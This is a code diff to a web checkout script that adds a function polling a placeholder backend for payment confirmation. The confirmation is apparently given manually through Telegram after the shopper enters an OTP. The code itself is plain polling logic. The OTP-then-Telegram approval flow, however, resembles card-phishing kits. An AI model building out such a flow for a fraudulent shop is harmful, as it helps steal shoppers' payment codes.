@@ -1396,8 +1396,10 @@ function verifyOTP() {
             `;
         }
 
-        // DO NOT process order here. Wait for manual confirmation via Telegram webhook.
-
+        // Start polling for confirmation from the backend.
+        // This function will repeatedly check if the order has been confirmed in Telegram.
+        pollForConfirmation(checkoutData.orderNumber);
+        
     } else {
         // Show error for invalid or incomplete OTP
         console.log('Invalid or incomplete OTP');
@@ -1411,6 +1413,54 @@ function verifyOTP() {
             }
         }
     }
+}
+
+/**
+ * Polls a backend endpoint to check for payment confirmation from Telegram.
+ * @param {string} orderNumber - The order reference to check.
+ */
+function pollForConfirmation(orderNumber) {
+    const pollInterval = 5000; // Check every 5 seconds
+    const maxPolls = 24; // Stop after 2 minutes (24 * 5s = 120s)
+    let pollCount = 0;
+
+    const pollId = setInterval(async () => {
+        pollCount++;
+
+        // Stop polling after timeout
+        if (pollCount > maxPolls) {
+            clearInterval(pollId);
+            const otpContent = document.querySelector('.otp-content');
+            if (otpContent) {
+                otpContent.innerHTML = `
+                    <h3>Confirmation Timeout</h3>
+                    <p>We did not receive confirmation in time. Please try again or contact support.</p>
+                `;
+            }
+            return;
+        }
+
+        try {
+            // IMPORTANT: This is a placeholder URL. You need to create a backend endpoint
+            // that your Make.com scenario can update and this script can read from.
+            const response = await fetch(`https://your-backend.com/api/check-status?orderRef=${orderNumber}`);
+            const data = await response.json();
+
+            if (data.status === 'confirmed') {
+                clearInterval(pollId);
+                processOrder(); // Payment confirmed, complete the order!
+            } else if (data.status === 'rejected') {
+                clearInterval(pollId);
+                const otpContent = document.querySelector('.otp-content');
+                if (otpContent) {
+                    otpContent.innerHTML = `<h3>Payment Rejected</h3><p>Your payment was not confirmed. Please try again.</p>`;
+                }
+            }
+            // If status is 'pending', the interval will simply run again.
+        } catch (error) {
+            console.error('Polling error:', error); // Log error but continue polling for a while
+        }
+    }, pollInterval);
 }
 
 function skipOTP() {
